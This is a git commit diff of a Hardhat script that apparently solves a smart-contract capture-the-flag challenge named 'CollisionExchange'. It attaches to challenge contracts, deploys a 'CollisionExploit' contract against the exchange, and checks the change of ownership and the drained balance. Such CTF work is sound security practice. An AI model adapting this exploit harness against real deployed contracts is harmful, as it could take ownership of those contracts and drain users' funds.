560a09fa4f259c4ef37e291324d07de13eb7b36a
band0x <98318897+band0x@users.noreply.github.com>
2022-02-22 09:23:50 +1100

    Update CollisionExchange.js

--- CollisionExchange.js
+++ CollisionExchange.js
@@ -10,69 +10,51 @@ async function main() {
   
 
   //get accounts and verify balances
-  //const [accounts] = await hre.ethers.getSigners();
-  //console.log("Signer is: ", accounts.address);
+  const [deployer,accounts] = await hre.ethers.getSigners();
+  console.log("Signer is: ", accounts.address);
+  console.log("Deployer is: ", deployer.address);
 
   
   //set addresses for current challenge
   const setupAddress = "0x5e40D0d98126323b81246008d386a93BA091704f";
   const challengeAddress = "0xE442a00a4587677c945598e19DF41822e851c1DE";
   const challengeName = "CollisionExchange";
-  const setupName = "SetupBackup";
-  const orderBookName = "OrderBook";
-  const orderBookAddress = "0x5CAF8Fa1f2a350A273cB7d6691f3c5Fcbc79C6B4";
-
-  //get accounts and verify balances
-  const [accounts,deployer] = await hre.ethers.getSigners();
-  console.log("Signer is: ", accounts.address);
-  console.log("Deployer is: ", deployer.address);
+  const setupName = "Setup";
+  
 
   
-   // deploy setup contract
-   const Setup = await hre.ethers.getContractFactory("Setup");
-   const setup = await Setup.connect(deployer).deploy({ value: parseEther("1") });
-   await setup.deployed();
-   console.log("Setup deployed to:", setup.address);
- 
-   // verify challenge contract
-   
-   console.log("Orderbook Instance:", await setup.orderBook());
-   console.log("Challenge Instance:", await setup.exchange());
-   
+  //attach setup
+  const setupContract = await hre.ethers.getContractAt(setupName, setupAddress);
+  //attach challenge
+  const challengeContract = await hre.ethers.getContractAt(challengeName, challengeAddress);
+  console.log("chlnge addr:", await setupContract.exchange());
+  
     
   //verify unsolved
-  console.log("Solved before ?: ", await setup.isSolved());
-  console.log("Starting balance:", await ethers.provider.getBalance(setup.exchange()));
-
-
-  //attach setup
-  //const setupContract = await hre.ethers.getContractAt(setupName, setupAddress);
-  //attach challenge
-  //const challengeContract = await hre.ethers.getContractAt(challengeName, challengeAddress);
-  const challengeContract = await hre.ethers.getContractAt(challengeName, setup.exchange());
-  //attach orderBook
- // const orderBookContract = await hre.ethers.getContractAt(orderBookName, orderBookAddress);
-  const orderBookContract = await hre.ethers.getContractAt(orderBookName, setup.orderBook());
-
-  //verify unsolved
-  console.log("Solved before ?: ", await setup.isSolved());
-  console.log("Starting balance:", await ethers.provider.getBalance(setup.exchange()));
+  console.log("Solved before ?: ", await setupContract.isSolved());
+  console.log("Starting balance:", await ethers.provider.getBalance(challengeAddress));
 
   //exploit logic
-  
   console.log("Starting owner:", await challengeContract.owner());
   
-  await challengeContract.postTrade(1);
+  // deploy exploit contract
+  const Exploit = await hre.ethers.getContractFactory("CollisionExploit");
+  const exploit = await Exploit.connect(deployer).deploy(challengeAddress);
+  await exploit.deployed();
+  console.log("Setup deployed to:", exploit.address);
+
+  
+  
   
   console.log("New owner:", await challengeContract.owner());
-  
+  console.log("Ending balance:", await ethers.provider.getBalance(setupContract.exchange()));
   //console.log("Trade :", await orderBookContract.getTrade());
   
-  await challengeContract.emergencyWithdraw();
+  
   
 
   //verify solved
-  console.log("Solved after?: ", await setup.isSolved());
+  console.log("Solved after?: ", await setupContract.isSolved());
   
 
   
